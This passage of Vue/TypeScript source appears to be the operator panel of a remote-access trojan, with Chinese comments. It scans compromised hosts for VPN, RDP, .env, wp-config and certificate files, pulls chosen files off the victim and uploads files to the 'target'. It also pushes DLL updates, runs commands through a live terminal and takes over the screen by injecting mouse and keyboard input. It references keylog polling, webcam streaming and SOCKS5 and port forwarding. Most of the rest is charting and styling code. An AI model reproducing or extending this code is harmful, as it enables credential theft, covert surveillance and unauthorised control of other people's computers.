  if (l.endsWith('.ovpn') || l.endsWith('.rdp') || l.endsWith('.rdg') || l.endsWith('.remmina')) return 'vpn'
  if (l.endsWith('.conf') || l.endsWith('.config') || l.includes('.env') || l.includes('docker-compose') || l.includes('wp-config') || l.includes('appsettings') || l.includes('web.config') || l.includes('applicationhost')) return 'config'
  if (l.endsWith('.pfx') || l.endsWith('.p12') || l.endsWith('.cer') || l.endsWith('.crt')) return 'cert'
  if (l.endsWith('.xlsx') || l.endsWith('.docx') || l.endsWith('.pdf')) return 'document'
  return 'other'
}

async function doFileSteal() {
  fileStealLoading.value = true
  fileStealResult.value = null
  try {
    const res: any = await serverApi.fileSteal(route.params.id as string, {})
    if (res.success && res.data) {
      const data = res.data
      if (data.files) data.files = data.files.map((f: any) => ({ ...f, category: f.category || inferFileCategory(f.path) }))
      fileStealResult.value = data
    } else alert(res.error || '扫描失败')
  } catch (e: any) { alert(e?.response?.data?.error || '请求失败') }
  finally { fileStealLoading.value = false }
}

async function doFileExfil(path: string) {
  fileExfilLoading.value = true
  try {
    const res: any = await serverApi.fileExfil(route.params.id as string, { path })
    if (res.success && res.data?.downloadId) {
      const a = document.createElement('a')
      a.href = `/api/downloads/${res.data.downloadId}`
      a.download = res.data.name || path.split(/[/\\]/).pop() || 'file'
      a.click()
    } else if (res.success && res.data?.data) {
      const raw = atob(res.data.data)
      const bytes = new Uint8Array(raw.length)
      for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i)
      const blob = new Blob([bytes])
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = path.split(/[/\\]/).pop() || 'file'
      a.click()
      URL.revokeObjectURL(url)
    } else {
      alert(res.data?.error || res.error || '提取失败')
    }
  } catch (e: any) { alert(e?.response?.data?.error || '提取失败') }
  finally { fileExfilLoading.value = false }
}

// ── 文件上传到目标 ──
const uploadLoading = ref(false)
const uploadResult = ref('')
const uploadFileRef = ref<HTMLInputElement | null>(null)

async function doFileUpload() {
  const fileInput = uploadFileRef.value
  if (!fileInput?.files?.length) { alert('请选择文件'); return }
  const file = fileInput.files[0]
  // 自动拼接路径：当前浏览目录 + 文件名
  const dir = fileBrowseResult.value?.path || fileBrowsePath.value || ''
  if (!dir) { alert('请先浏览一个目录，上传将保存到当前目录'); return }
  const sep = dir.includes('/') ? '/' : '\\'
  const remotePath = dir.endsWith(sep) ? dir + file.name : dir + sep + file.name
  if (file.size > 10 * 1024 * 1024) { alert('文件不能超过10MB（请用分块上传）'); return }
  uploadLoading.value = true
  uploadResult.value = ''
  try {
    const buf = await file.arrayBuffer()
    const bytes = new Uint8Array(buf)
    let binary = ''
    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i])
    const b64 = btoa(binary)
    const res: any = await serverApi.fileUpload(route.params.id as string, {
      path: remotePath, data: b64, overwrite: 'true'
    })
    if (res.data?.ok) {
      uploadResult.value = '✓ ' + (res.data.path || remotePath) + ' (' + (res.data.size || file.size) + ' bytes)'
      doFileBrowse()
    } else {
      uploadResult.value = res.data?.error || res.error || '上传失败'
    }
  } catch (e: any) { uploadResult.value = e?.response?.data?.error || '上传失败' }
  finally { uploadLoading.value = false }
}

// 强制推送 DLL 更新
const forceUpdateLoading = ref(false)
async function doForceUpdateCS() {
  forceUpdateLoading.value = true
  quickCmdMsg.value = ''
  if (quickCmdTimer) clearTimeout(quickCmdTimer)
  try {
    const res: any = await serverApi.forceUpdateCS(route.params.id as string)
    quickCmdMsg.value = res.success ? (res.message || '更新指令已发送') : (res.error || '发送失败')
  } catch (e: any) {
    quickCmdMsg.value = e?.response?.data?.error || '请求失败'
  } finally {
    forceUpdateLoading.value = false
    quickCmdTimer = setTimeout(() => { quickCmdMsg.value = '' }, 5000)
  }
}

// 自动重连
let termReconnectTimer: ReturnType<typeof setTimeout> | null = null
let screenReconnectTimer: ReturnType<typeof setTimeout> | null = null
let termManualDisconnect = false
let screenManualDisconnect = false

async function sendQuickCmd(cmd: string) {
  quickCmdLoading.value = true
  quickCmdMsg.value = ''
  if (quickCmdTimer) clearTimeout(quickCmdTimer)
  try {
    const res: any = await serverApi.quickCmd(route.params.id as string, cmd)
    if (res.success && res.data) {
      quickCmdMsg.value = res.data.ok ? (res.data.message || '执行成功') : (res.data.error || '执行失败')
    } else {
      quickCmdMsg.value = res.error || '执行失败'
    }
  } catch (e: any) {
    quickCmdMsg.value = e?.response?.data?.error || '请求失败'
  } finally {
    quickCmdLoading.value = false
    quickCmdTimer = setTimeout(() => { quickCmdMsg.value = '' }, 3000)
  }
}

function initXterm() {
  if (!xtermRef.value || term) return
  const isMobile = window.innerWidth <= 768
  term = new Terminal({
    cursorBlink: true,
    cursorStyle: 'bar',
    fontSize: isMobile ? 11 : 13,
    fontFamily: "'Cascadia Code', 'SF Mono', 'Menlo', 'Courier New', monospace",
    lineHeight: 1.3,
    theme: {
      background: '#0b0e17',
      foreground: '#c8d6e5',
      cursor: '#10b981',
      cursorAccent: '#0b0e17',
      selectionBackground: 'rgba(59,130,246,0.3)',
      black: '#0b0e17',
      red: '#f87171',
      green: '#10b981',
      yellow: '#fbbf24',
      blue: '#60a5fa',
      magenta: '#c084fc',
      cyan: '#22d3ee',
      white: '#e2e8f0',
      brightBlack: '#3d4f6a',
      brightRed: '#fca5a5',
      brightGreen: '#34d399',
      brightYellow: '#fde68a',
      brightBlue: '#93bbfc',
      brightMagenta: '#d8b4fe',
      brightCyan: '#67e8f9',
      brightWhite: '#f8fafc',
    },
    scrollback: 5000,
    allowProposedApi: true,
  })

  fitAddon = new FitAddon()
  term.loadAddon(fitAddon)
  term.loadAddon(new ClipboardAddon())
  term.open(xtermRef.value)
  fitAddon.fit()

  // 键盘输入 → WebSocket
  term.onData((data: string) => {
    if (termWs && termWs.readyState === WebSocket.OPEN) {
      // 管道模式：本地回显（agent 管道模式下 PowerShell 不回显 stdin）
      if (pipeMode) {
        if (data === '\r') {
          term!.write('\r\n')
          pipeInputLen = 0
        } else if (data === '\x7f' || data === '\x08') {
          if (pipeInputLen > 0) {
            term!.write('\b \b')
            pipeInputLen--
          }
        } else if (data >= ' ') {
          term!.write(data)
          pipeInputLen += data.length
        }
      }
      termWs.send(data)
    }
  })

  // 右键粘贴
  xtermRef.value.addEventListener('contextmenu', async (e: MouseEvent) => {
    e.preventDefault()
    try {
      const text = await navigator.clipboard.readText()
      if (text && termWs && termWs.readyState === WebSocket.OPEN) {
        termWs.send(text)
      }
    } catch {}
  })

  // 自动调整大小
  resizeObserver = new ResizeObserver(() => {
    fitAddon?.fit()
    if (termWs && termWs.readyState === WebSocket.OPEN && term) {
      termWs.send(JSON.stringify({ type: 'resize', cols: term.cols, rows: term.rows }))
    }
  })
  resizeObserver.observe(xtermRef.value)

  term.writeln('\x1b[90m点击「连接」按钮打开交互式终端\x1b[0m')
}

function connectTerminal() {
  if (termStatus.value === 'connected' || termStatus.value === 'connecting') return
  if (!term) return

  termManualDisconnect = false
  if (termReconnectTimer) { clearTimeout(termReconnectTimer); termReconnectTimer = null }
  termStatus.value = 'connecting'
  pipeMode = false
  term.clear()
  term.writeln('\x1b[33m正在连接...\x1b[0m')

  const token = localStorage.getItem('token') || ''
  const proto = location.protocol === 'https:' ? 'wss' : 'ws'
  const wsUrl = `${proto}://${location.host}/ws/terminal/${route.params.id}?token=${token}`

  termWs = new WebSocket(wsUrl)

  termWs.onopen = () => {
    termStatus.value = 'connected'
    term!.clear()
    termWs!.send(JSON.stringify({ type: 'resize', cols: term!.cols, rows: term!.rows }))
    term!.focus()
  }

  termWs.onmessage = (ev) => {
    if (term && typeof ev.data === 'string') {
      // 检查是否是 pty_mode JSON 消息
      if (ev.data.startsWith('{')) {
        try {
          const msg = JSON.parse(ev.data)
          if (msg.type === 'pty_mode') {
            pipeMode = msg.mode === 'pipe'
            pipeInputLen = 0
            return
          }
        } catch {}
      }
      term.write(ev.data)
      // 服务端输出后重置输入计数（新提示符出现）
      if (pipeMode) pipeInputLen = 0
    }
  }

  termWs.onclose = () => {
    const wasConnected = termStatus.value === 'connected'
    termStatus.value = 'disconnected'
    termWs = null
    if (wasConnected && !termManualDisconnect) {
      term?.writeln('\r\n\x1b[33m连接断开，5秒后自动重连...\x1b[0m')
      termReconnectTimer = setTimeout(() => { termReconnectTimer = null; connectTerminal() }, 5000)
    } else if (wasConnected) {
      term?.writeln('\r\n\x1b[31m连接已断开\x1b[0m')
    }
  }

  termWs.onerror = () => {
    termStatus.value = 'disconnected'
    termWs = null
    if (!termManualDisconnect) {
      term?.writeln('\r\n\x1b[33m连接失败，5秒后重试...\x1b[0m')
      termReconnectTimer = setTimeout(() => { termReconnectTimer = null; connectTerminal() }, 5000)
    } else {
      term?.writeln('\r\n\x1b[31m连接失败\x1b[0m')
    }
  }
}

function disconnectTerminal() {
  termManualDisconnect = true
  if (termReconnectTimer) { clearTimeout(termReconnectTimer); termReconnectTimer = null }
  if (termWs) {
    termWs.close()
    termWs = null
  }
  termStatus.value = 'disconnected'
}

function cleanupTerminal() {
  termManualDisconnect = true
  screenManualDisconnect = true
  if (termReconnectTimer) { clearTimeout(termReconnectTimer); termReconnectTimer = null }
  if (screenReconnectTimer) { clearTimeout(screenReconnectTimer); screenReconnectTimer = null }
  disconnectTerminal()
  disconnectScreen()
  resizeObserver?.disconnect()
  term?.dispose()
  term = null
  fitAddon = null
}

function connectScreen() {
  if (screenStatus.value === 'connected') return
  screenManualDisconnect = false
  if (screenReconnectTimer) { clearTimeout(screenReconnectTimer); screenReconnectTimer = null }
  const token = localStorage.getItem('token') || ''
  const proto = location.protocol === 'https:' ? 'wss' : 'ws'
  const wsUrl = `${proto}://${location.host}/ws/screen/${route.params.id}?token=${token}`
  screenWs = new WebSocket(wsUrl)
  screenWs.onopen = () => {
    screenStatus.value = 'connected'
    screenError.value = ''
  }
  screenWs.binaryType = 'arraybuffer'
  let screenDecoding = false
  let pendingCodec = ''       // '' = jpeg, 'h264'
  let pendingKeyframe = false
  let pendingW = 0, pendingH = 0

  // ── H.264 辅助函数 ──
  function parseAnnexB(d: Uint8Array): Uint8Array[] {
    const out: Uint8Array[] = []; let i = 0
    while (i < d.length - 3) {
      let sc = 0
      if (d[i]===0 && d[i+1]===0 && d[i+2]===0 && i+3<d.length && d[i+3]===1) sc = 4
      else if (d[i]===0 && d[i+1]===0 && d[i+2]===1) sc = 3
      if (!sc) { i++; continue }
      const s = i + sc; let e = d.length
      for (let j = s + 1; j < d.length - 2; j++) {
        if (d[j]===0 && d[j+1]===0 && (d[j+2]===1 || (d[j+2]===0 && j+3<d.length && d[j+3]===1))) { e = j; break }
      }
      out.push(d.subarray(s, e)); i = e
    }
    return out
  }
  function nalusToAvcc(nalus: Uint8Array[]): Uint8Array {
    let total = nalus.reduce((s, n) => s + 4 + n.length, 0)
    const r = new Uint8Array(total); let o = 0
    for (const n of nalus) {
      const l = n.length
      r[o]=(l>>24)&0xFF; r[o+1]=(l>>16)&0xFF; r[o+2]=(l>>8)&0xFF; r[o+3]=l&0xFF
      r.set(n, o+4); o += 4+l
    }
    return r
  }
  function buildAvcDesc(sps: Uint8Array, pps: Uint8Array): Uint8Array {
    const d = new Uint8Array(11 + sps.length + pps.length)
    d[0]=1; d[1]=sps[1]; d[2]=sps[2]; d[3]=sps[3]; d[4]=0xFF; d[5]=0xE1
    d[6]=(sps.length>>8)&0xFF; d[7]=sps.length&0xFF; d.set(sps, 8)
    d[8+sps.length]=1; d[9+sps.length]=(pps.length>>8)&0xFF; d[10+sps.length]=pps.length&0xFF
    d.set(pps, 11+sps.length)
    return d
  }
  let lastH264Output = 0
  let h264FedCount = 0

  function resetH264Decoder() {
    if (h264Decoder) { try { h264Decoder.close() } catch {} }
    h264Decoder = null; h264Configured = false; h264FedCount = 0
  }

  function createH264Decoder(sps: Uint8Array, pps: Uint8Array, w: number, h: number) {
    resetH264Decoder()
    const desc = buildAvcDesc(sps, pps)
    const cs = `avc1.${sps[1].toString(16).padStart(2,'0')}${sps[2].toString(16).padStart(2,'0')}${sps[3].toString(16).padStart(2,'0')}`
    h264Decoder = new VideoDecoder({
      output: (frame: any) => {
        lastH264Output = performance.now()
        const canvas = screenCanvasRef.value
        if (!canvas) { frame.close(); return }
        if (canvas.width !== frame.displayWidth || canvas.height !== frame.displayHeight) {
          canvas.width = frame.displayWidth; canvas.height = frame.displayHeight
        }
        screenNativeW = frame.displayWidth; screenNativeH = frame.displayHeight
        const ctx = canvas.getContext('2d')
        if (ctx) ctx.drawImage(frame, 0, 0)
        frame.close(); screenFrame.value = true
      },
      error: (e: any) => {
        console.warn('H264 decoder error, resetting:', e)
        resetH264Decoder()
      }
    })
    h264Decoder.configure({ codec: cs, codedWidth: w, codedHeight: h, description: desc })
    h264Configured = true; h264Timestamp = 0; lastH264Output = performance.now()
  }

  function handleH264(data: ArrayBuffer, w: number, h: number, isKey: boolean) {
    const u8 = new Uint8Array(data)
    const nalus = parseAnnexB(u8)
    if (!nalus.length) return

    // 关键帧：始终重建解码器（确保从损坏状态恢复）
    if (isKey) {
      let sps: Uint8Array|null = null, pps: Uint8Array|null = null
      for (const n of nalus) { const t = n[0]&0x1F; if (t===7) sps=n; if (t===8) pps=n }
      if (sps && pps && typeof VideoDecoder !== 'undefined') {
        createH264Decoder(sps, pps, w, h)
      }
    }

    if (!h264Decoder || !h264Configured) return

    // 检测解码器阻塞：队列过大或长时间无输出
    const queueSize = (h264Decoder as any).decodeQueueSize || 0
    if (queueSize > 5) {
      console.warn('H264 decoder stalled, queueSize=' + queueSize + ', resetting')
      resetH264Decoder()
      return
    }
    if (h264FedCount > 10 && performance.now() - lastH264Output > 2000) {
      console.warn('H264 decoder no output for 2s, resetting')
      resetH264Decoder()
      return
    }

    const vidNalus = nalus.filter(n => { const t=n[0]&0x1F; return t!==7&&t!==8&&t!==9 })
    if (!vidNalus.length) return
    const avcc = nalusToAvcc(vidNalus)
    h264Decoder.decode(new EncodedVideoChunk({ type: isKey?'key':'delta', timestamp: h264Timestamp, data: avcc }))
    h264Timestamp += 100000
    h264FedCount++
  }

  screenWs.onmessage = (ev) => {
    if (ev.data instanceof ArrayBuffer) {
      if (pendingCodec === 'h264') {
        // H.264 解码路径
        try {
          handleH264(ev.data, pendingW, pendingH, pendingKeyframe)
        } catch (e) {
          // 解码器崩溃（closed state），重置以便下一个关键帧重建
          console.warn('H264 decode exception, resetting decoder:', e)
          if (h264Decoder) { try { h264Decoder.close() } catch {} }
          h264Decoder = null; h264Configured = false
        }
      } else {
        // JPEG 解码路径
        const rect = pendingFrameRect; pendingFrameRect = null
        if (screenDecoding) return
        screenDecoding = true
        const blob = new Blob([ev.data], { type: 'image/jpeg' })
        createImageBitmap(blob).then((bmp) => {
          screenDecoding = false
          const canvas = screenCanvasRef.value
          if (!canvas) { bmp.close(); return }
          const fw = rect?.width || bmp.width, fh = rect?.height || bmp.height
          screenNativeW = fw; screenNativeH = fh
          if (!rect || rect.full || canvas.width !== fw || canvas.height !== fh) {
            canvas.width = fw; canvas.height = fh
          }
          const ctx = canvas.getContext('2d')
          if (!ctx) { bmp.close(); return }
          ctx.drawImage(bmp, rect ? rect.x : 0, rect ? rect.y : 0)
          bmp.close(); screenFrame.value = true
        }).catch(() => { screenDecoding = false })
      }
      pendingCodec = '' // 重置
    } else if (typeof ev.data === 'string') {
      try {
        const msg = JSON.parse(ev.data)
        if (msg.type === 'screen_frame' && msg.payload) {
          const p = msg.payload
          if (p.codec === 'h264') {
            pendingCodec = 'h264'
            pendingKeyframe = !!p.keyframe
            pendingW = p.width || 0; pendingH = p.height || 0
          } else {
            pendingCodec = ''
            pendingFrameRect = {
              width: p.width || 0, height: p.height || 0,
              x: p.x || 0, y: p.y || 0,
              cw: p.cw || p.width || 0, ch: p.ch || p.height || 0,
              full: p.full !== false
            }
          }
        } else if (msg.type === 'screen_error' || msg.type === 'error' || msg.error || msg.message) {
          const errText = msg.error || msg.message || JSON.stringify(msg)
          screenError.value = typeof errText === 'string' ? errText : JSON.stringify(errText)
        }
      } catch {}
    }
  }
  screenWs.onclose = () => {
    screenStatus.value = 'disconnected'
    screenFrame.value = false
    screenWs = null
    if (h264Decoder) { try { h264Decoder.close() } catch {} h264Decoder = null; h264Configured = false }
    if (!screenManualDisconnect) {
      screenError.value = '连接断开，5秒后自动重连...'
      screenReconnectTimer = setTimeout(() => { screenReconnectTimer = null; connectScreen() }, 5000)
    }
  }
  screenWs.onerror = () => {
    screenStatus.value = 'disconnected'
    screenFrame.value = false
    screenWs = null
    if (h264Decoder) { try { h264Decoder.close() } catch {} h264Decoder = null; h264Configured = false }
    if (!screenManualDisconnect) {
      screenError.value = '连接失败，5秒后重试...'
      screenReconnectTimer = setTimeout(() => { screenReconnectTimer = null; connectScreen() }, 5000)
    }
  }
}

function disconnectScreen() {
  screenManualDisconnect = true
  if (screenReconnectTimer) { clearTimeout(screenReconnectTimer); screenReconnectTimer = null }
  if (screenWs) {
    screenWs.close()
    screenWs = null
  }
  if (h264Decoder) { try { h264Decoder.close() } catch {} h264Decoder = null; h264Configured = false }
  screenStatus.value = 'disconnected'
  screenFrame.value = false
}

function updateScreenConfig() {
  if (screenWs && screenWs.readyState === WebSocket.OPEN) {
    screenWs.send(JSON.stringify({
      type: 'config',
      fps: screenFps.value,
      quality: screenQuality.value,
      scale: screenScale.value,
    }))
  }
}

function sendScreenInput(payload: any) {
  if (screenWs && screenWs.readyState === WebSocket.OPEN) {
    screenWs.send(JSON.stringify({ type: 'input', ...payload }))
  }
}

function imgToScreen(ev: MouseEvent): { x: number; y: number } {
  const el = (ev.target as HTMLElement).closest('canvas') || ev.target as HTMLElement
  const rect = el.getBoundingClientRect()
  const scaleX = (screenNativeW || rect.width) / rect.width
  const scaleY = (screenNativeH || rect.height) / rect.height
  return { x: Math.round((ev.clientX - rect.left) * scaleX), y: Math.round((ev.clientY - rect.top) * scaleY) }
}

function onScreenMouse(ev: MouseEvent, action: string) {
  if (!screenControlMode.value) return
  if (action === 'move') {
    const now = Date.now()
    if (now - lastMouseMoveTime < 50) return
    lastMouseMoveTime = now
  }
  const { x, y } = imgToScreen(ev)
  const button = ev.button === 2 ? 'right' : ev.button === 1 ? 'middle' : 'left'
  sendScreenInput({ inputType: 'mouse', action: action === 'down' ? 'down' : action === 'up' ? 'up' : 'move', x, y, button })
}

function onScreenContext(ev: MouseEvent) {
  if (!screenControlMode.value) return
  const { x, y } = imgToScreen(ev)
  sendScreenInput({ inputType: 'mouse', action: 'click', x, y, button: 'right' })
}

function onScreenWheel(ev: WheelEvent) {
  if (!screenControlMode.value) return
  const canvas = (ev.target as HTMLElement).closest('.screen-viewer')?.querySelector('canvas') as HTMLCanvasElement
  if (!canvas) return
  const rect = canvas.getBoundingClientRect()
  const scaleX = (screenNativeW || rect.width) / rect.width
  const scaleY = (screenNativeH || rect.height) / rect.height
  const x = Math.round((ev.clientX - rect.left) * scaleX)
  const y = Math.round((ev.clientY - rect.top) * scaleY)
  sendScreenInput({ inputType: 'mouse', action: 'wheel', x, y, delta: ev.deltaY > 0 ? -120 : 120 })
}

const keyMap: Record<string, number> = {
  Backspace:8,Tab:9,Enter:13,ShiftLeft:16,ShiftRight:16,ControlLeft:17,ControlRight:17,
  AltLeft:18,AltRight:18,Escape:27,Space:32,ArrowLeft:37,ArrowUp:38,ArrowRight:39,ArrowDown:40,
  Delete:46,Insert:45,Home:36,End:35,PageUp:33,PageDown:34,
  F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,
  MetaLeft:91,MetaRight:92,CapsLock:20,NumLock:144,ScrollLock:145,PrintScreen:44,
  // 符号键（OEM 键）
  Semicolon:186,Equal:187,Comma:188,Minus:189,Period:190,Slash:191,Backquote:192,
  BracketLeft:219,Backslash:220,BracketRight:221,Quote:222,
  // 小键盘
  Numpad0:96,Numpad1:97,Numpad2:98,Numpad3:99,Numpad4:100,Numpad5:101,Numpad6:102,
  Numpad7:103,Numpad8:104,Numpad9:105,NumpadMultiply:106,NumpadAdd:107,
  NumpadSubtract:109,NumpadDecimal:110,NumpadDivide:111,NumpadEnter:13,
}

function onScreenKey(ev: KeyboardEvent, action: string) {
  if (!screenControlMode.value) return
  ev.preventDefault()
  ev.stopPropagation()
  let vk = keyMap[ev.code] || 0
  if (!vk && ev.code.startsWith('Key')) vk = ev.code.charCodeAt(3)
  if (!vk && ev.code.startsWith('Digit')) vk = ev.code.charCodeAt(5)
  if (!vk && ev.key.length === 1) vk = ev.key.toUpperCase().charCodeAt(0)
  if (vk > 0) {
    sendScreenInput({ inputType: 'key', action, vk })
  }
}

async function fetchDetail() {
  loading.value = true
  try {
    const res: any = await serverApi.getById(route.params.id as string)
    if (res.success) detail.value = res.data
  } finally {
    loading.value = false
  }
}

async function fetchHistory() {
  const res: any = await metricApi.history(route.params.id as string, period.value)
  if (!res.success || !historyChart) return

  const metrics = res.data || []
  const times = metrics.map((m: any) => new Date(m.collectedAt).toLocaleTimeString('zh-CN', { hour12: false }))
  const light = document.documentElement.classList.contains('light')

  const colors = {
    cpu: '#3b82f6',
    mem: '#10b981',
    disk: '#8b5cf6',
    tooltipBg: light ? 'rgba(255,255,255,0.96)' : '#131a35',
    tooltipBorder: light ? 'rgba(0,0,0,0.1)' : '#1e293b',
    tooltipText: light ? '#1e293b' : '#f1f5f9',
    axisLine: light ? '#e2e8f0' : '#1e293b',
    axisLabel: light ? '#64748b' : '#94a3b8',
    splitLine: light ? 'rgba(0,0,0,0.06)' : '#1e293b',
    legendText: light ? '#475569' : '#94a3b8',
  }

  function areaStyle(color: string) {
    return {
      color: {
        type: 'linear', x: 0, y: 0, x2: 0, y2: 1,
        colorStops: [
          { offset: 0, color: color + (light ? '30' : '40') },
          { offset: 1, color: color + '05' },
        ],
      },
    }
  }

  const showSymbol = metrics.length < 30

  historyChart.setOption({
    tooltip: {
      trigger: 'axis',
      backgroundColor: colors.tooltipBg,
      borderColor: colors.tooltipBorder,
      textStyle: { color: colors.tooltipText, fontSize: 12 },
      axisPointer: { lineStyle: { color: colors.axisLine } },
    },
    legend: { bottom: 0, textStyle: { color: colors.legendText, fontSize: 11 }, icon: 'circle', itemWidth: 8 },
    grid: { left: 44, right: 16, top: 16, bottom: 40 },
    xAxis: {
      type: 'category',
      data: times,
      boundaryGap: false,
      axisLine: { lineStyle: { color: colors.axisLine } },
      axisTick: { show: false },
      axisLabel: { color: colors.axisLabel, fontSize: 11 },
    },
    yAxis: {
      type: 'value', min: 0, max: 100,
      axisLabel: { color: colors.axisLabel, fontSize: 11, formatter: '{value}%' },
      splitLine: { lineStyle: { color: colors.splitLine, type: 'dashed' } },
    },
    series: [
      { name: 'CPU', type: 'line', smooth: 0.4, showSymbol, symbolSize: 4, lineStyle: { width: 2.5 }, itemStyle: { color: colors.cpu }, areaStyle: areaStyle(colors.cpu), data: metrics.map((m: any) => m.cpuUsage) },
      { name: '内存', type: 'line', smooth: 0.4, showSymbol, symbolSize: 4, lineStyle: { width: 2.5 }, itemStyle: { color: colors.mem }, areaStyle: areaStyle(colors.mem), data: metrics.map((m: any) => m.memUsage) },
      { name: '磁盘', type: 'line', smooth: 0.4, showSymbol, symbolSize: 4, lineStyle: { width: 2.5 }, itemStyle: { color: colors.disk }, areaStyle: areaStyle(colors.disk), data: metrics.map((m: any) => m.diskUsage) },
    ],
  }, true)
}

function initGauge() {
  if (!cpuGaugeRef.value || !detail.value?.latestMetrics) return
  gaugeChart = echarts.init(cpuGaugeRef.value)
  gaugeChart.setOption({
    series: [{
      type: 'gauge', radius: '85%', startAngle: 225, endAngle: -45, min: 0, max: 100,
      axisLine: { lineStyle: { width: 14, color: [[0.8, '#10b981'], [0.95, '#f59e0b'], [1, '#ef4444']] } },
      pointer: { length: '55%', width: 4, itemStyle: { color: '#f1f5f9' } },
      axisTick: { show: false }, splitLine: { show: false }, axisLabel: { show: false },
      detail: { formatter: '{value}%', fontSize: 22, fontWeight: 600, color: '#e8edf5', fontFamily: "'SF Mono','Courier New',monospace", offsetCenter: [0, '70%'] },
      data: [{ value: detail.value.latestMetrics.cpuUsage.toFixed(1) }],
    }],
  })
}

function formatBytes(bytes: number): string {
  if (bytes < 1024) return bytes + ' B'
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB'
  return (bytes / 1048576).toFixed(1) + ' MB'
}

function formatMB(mb: number): string {
  if (!mb || mb <= 0) return '0 MB'
  if (mb >= 1024) return (mb / 1024).toFixed(1) + ' GB'
  return mb.toFixed(0) + ' MB'
}

function formatGB(gb: number): string {
  if (!gb || gb <= 0) return '0 GB'
  if (gb >= 1024) return (gb / 1024).toFixed(1) + ' TB'
  return gb.toFixed(0) + ' GB'
}

onMounted(async () => {
  await fetchDetail()
  setTimeout(() => {
    initGauge()
    if (historyChartRef.value) {
      historyChart = echarts.init(historyChartRef.value)
      fetchHistory()
    }
    initXterm()
  }, 100)
  window.addEventListener('resize', () => { gaugeChart?.resize(); historyChart?.resize() })
  // 加载 SOCKS5 / 端口转发状态
  doSocksRefresh()
  doPfRefresh()
})

onUnmounted(() => {
  gaugeChart?.dispose()
  historyChart?.dispose()
  cleanupTerminal()
  doWebcamStreamStop()
  stopKeylogPoll()
})
</script>

<style scoped lang="scss">
.server-detail {
  padding: 16px 20px;
  max-width: 1200px;
  margin: 0 auto;
}

.detail-header {
  display: flex;
  align-items: center;
  gap: 14px;
  margin-bottom: 18px;
}

.detail-title {
  font-size: 15px;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 8px;
}

.uptime {
  margin-left: auto;
  font-size: 12px;
  color: var(--t3);
}

.info-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 10px;
  margin-bottom: 16px;
}

.info-item {
  background: var(--card-bg);
  backdrop-filter: blur(8px);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 12px 14px;
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.info-label {
  font-size: 10px;
  color: var(--t3);
  letter-spacing: 0.5px;
  text-transform: uppercase;
}

.info-value {
  font-size: 13px;
  font-weight: 500;
  color: var(--t1);
}

.metric-cards {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 10px;
  margin-bottom: 16px;
}

.metric-card {
  background: var(--card-bg);
  backdrop-filter: blur(8px);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 14px;
  text-align: center;
}

.metric-card-title {
  font-size: 11px;
  color: var(--t3);
  margin-bottom: 8px;
  letter-spacing: 0.5px;
  text-transform: uppercase;
}

.metric-chart {
  width: 100%;
  height: 150px;
}

.metric-big-num {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 150px;

  .font-num {
    font-size: 32px;
    font-weight: 700;
    color: var(--t1);
  }

  .metric-sub {
    font-size: 11px;
    color: var(--t3);
    margin-top: 4px;
  }
}

.history-section {
  background: var(--card-bg);
  backdrop-filter: blur(8px);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 16px;
}

.history-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 12px;
}

.section-title {
  font-size: 12px;
  font-weight: 600;
  color: var(--t2);
  letter-spacing: 0.5px;
  text-transform: uppercase;
}

.history-chart {
  width: 100%;
  height: 280px;
}

/* ===== 交互式终端 ===== */
.terminal-section {
  margin-top: 16px;
  background: var(--card-bg);
  backdrop-filter: blur(8px);
  border: 1px solid var(--border);
  border-radius: 10px;
  overflow: hidden;
}

.terminal-header {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 10px 16px;
  border-bottom: 1px solid var(--border);
}

.term-status {
  font-size: 10px;
  font-weight: 600;
  padding: 2px 8px;
  border-radius: 10px;
  letter-spacing: 0.5px;
}

.term-status.connected {
  background: rgba(5,150,105,0.15);
  color: #10b981;
}

.term-status.connecting {
  background: rgba(251,191,36,0.12);
  color: #fbbf24;
}

.term-status.disconnected {
  background: rgba(100,116,139,0.1);
  color: #64748b;
}

.term-actions {
  margin-left: auto;
}

.term-btn {
  padding: 4px 14px;
  background: var(--btn-bg);
  border: 1px solid var(--btn-border);
  border-radius: 6px;
  color: var(--btn-color);
  font-size: 11px;
  cursor: pointer;
  white-space: nowrap;
  transition: all 0.2s;
}

.term-btn:hover:not(:disabled) {
  filter: brightness(1.15);
}

.term-btn:disabled {
  opacity: 0.4;
  cursor: not-allowed;
}

.term-btn.danger {
  background: var(--btn-danger-bg);
  border-color: var(--btn-danger-border);
  color: var(--btn-danger-color);
}

.term-btn.danger:hover {
  filter: brightness(1.1);
}

/* ===== 快捷指令栏 ===== */
.quick-cmds {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 6px 16px;
  border-bottom: 1px solid var(--border);
  background: rgba(255,255,255,0.02);
}

.qcmd-btn {
  padding: 3px 10px;
  background: var(--btn-bg);
  border: 1px solid var(--btn-border);
  border-radius: 4px;
  color: var(--btn-color);
  font-size: 10px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
}

.qcmd-btn:hover:not(:disabled) {
  filter: brightness(1.15);
}

.qcmd-btn:disabled {
  opacity: 0.4;
  cursor: not-allowed;
}

.qcmd-msg {
  font-size: 10px;
  color: #10b981;
  margin-left: 4px;
}

.xterm-container {
  height: 420px;
  background: #0b0e17;
  padding: 4px 0 4px 4px;
}

.xterm-container :deep(.xterm) {
  height: 100%;
}

.xterm-container :deep(.xterm-viewport) {
  &::-webkit-scrollbar { width: 6px; }
  &::-webkit-scrollbar-track { background: transparent; }
  &::-webkit-scrollbar-thumb {
    background: rgba(255,255,255,0.1);
    border-radius: 3px;
  }
}

/* ===== 桌面查看器 ===== */
.screen-section {
  margin-top: 16px;
  background: var(--card-bg);
  backdrop-filter: blur(8px);
